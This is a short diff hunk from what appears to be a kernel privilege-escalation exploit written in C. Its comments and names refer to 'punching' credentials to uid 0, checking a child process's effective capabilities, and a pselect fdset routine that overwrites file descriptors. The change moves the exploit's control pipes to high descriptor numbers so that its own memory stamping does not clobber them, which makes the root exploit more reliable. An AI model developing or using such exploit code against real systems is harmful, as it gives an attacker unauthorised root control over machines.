@@ -2135,8 +2135,14 @@ uid0_cred_punch:;
   /* landing-checked retry: the route loop verifies each punch attempt via
    * this child's CapEff (do_pselect_fake_lock_route MODE4_SLIDE_CRED) */
   g_uid0_child_pid = (long)child;
-  g_uid0_cmd_w = pipes.cmd_w;
-  g_uid0_uid_r = pipes.uid_r;
+  /* The pselect fdset machinery dup2()s over EVERY fd 0..319 whose bit
+   * appears in the stamp words (pointer-valued -> random low bits set).
+   * Pipes in that range get clobbered mid-run (detector 9997 + old
+   * hangs). Move them above NFDS=320. */
+  g_uid0_cmd_w = fcntl(pipes.cmd_w, F_DUPFD, 900);
+  g_uid0_uid_r = fcntl(pipes.uid_r, F_DUPFD, 901);
+  if (g_uid0_cmd_w >= 0) { close(pipes.cmd_w); pipes.cmd_w = g_uid0_cmd_w; }
+  if (g_uid0_uid_r >= 0) { close(pipes.uid_r); pipes.uid_r = g_uid0_uid_r; }
   g_uid0_cred_landed = 0;
 
   uintptr_t child_self = 0;
